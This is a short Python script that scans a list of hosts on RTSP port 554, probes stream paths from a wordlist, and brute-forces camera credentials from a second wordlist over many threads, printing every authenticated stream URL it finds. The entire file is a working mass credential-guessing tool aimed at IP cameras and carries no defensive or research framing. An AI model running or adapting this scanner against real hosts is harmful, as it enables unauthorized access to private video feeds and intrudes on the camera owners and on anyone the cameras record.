#!/usr/bin/env python
import re
import sys
import socket as so
from fire import Fire
from concurrent.futures import ThreadPoolExecutor as TPE
from functools import partial


status_re = re.compile(r'RTSP/\d\.\d (\d\d\d)')


def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout: float = 3):
    if cred:
        cred += '@'
    req = (
        f'DESCRIBE rtsp://{cred}{host}:{port}{path} RTSP/1.0\r\n'
        'CSeq: 2\r\n'
        # 'Accept: application/sdp\r\n'
        # 'User-Agent: Mozilla/5.0\r\n'
        '\r\n'
    )
    with so.socket() as s:
        s.settimeout(timeout)
        s.connect((host, port))
        s.sendall(req.encode())
        response = s.recv(1024).decode()
        return int(status_re.findall(response)[0])


def check_cred(host, port, path, cred):
    code = rtsp_req(host, port, path, cred)
    if code != 200:
        print('∙', end='', flush=True)
        return

    print('∎', end='', flush=True)
    return f'rtsp://{cred}@{host}:{port}{path}'


def check_path(host, port, path):
    try:
        code = rtsp_req(host, port, path)
        if code in [200, 401, 403]:
            with TPE(4) as ex:
                ch = partial(check_cred, host, port, path)
                with open('./data/rtsp_creds.txt') as f:
                    creds = [ln.rstrip() for ln in f]

                results = []
                for res in ex.map(ch, creds):
                    if res:
                        results.append(res)
                        break  # 1 cred per path is enough
                return results
    except KeyboardInterrupt:
        raise
    except:
        pass
    return []


def check_host(host):
    ch = partial(check_path, host, 554)

    with TPE(4) as ex:
        with open('./data/rtsp_paths.txt') as f:
            paths = [ln.rstrip() for ln in f]

        results = []
        for res in ex.map(ch, paths):
            for rr in res:
                if rr:
                    if '0h84d' in rr:
                        return
                    results.append(rr)

        return results


def main():
    with open('./local/hosts_554.txt') as f:
        hosts = [ln.rstrip() for ln in f]

    with TPE(64) as ex:
        for i, res in enumerate(ex.map(check_host, hosts)):
            if res:
                print()
                print(f'[+ {i}]')
                for url in res:
                    print(url)


if __name__ == "__main__":
    Fire(main)
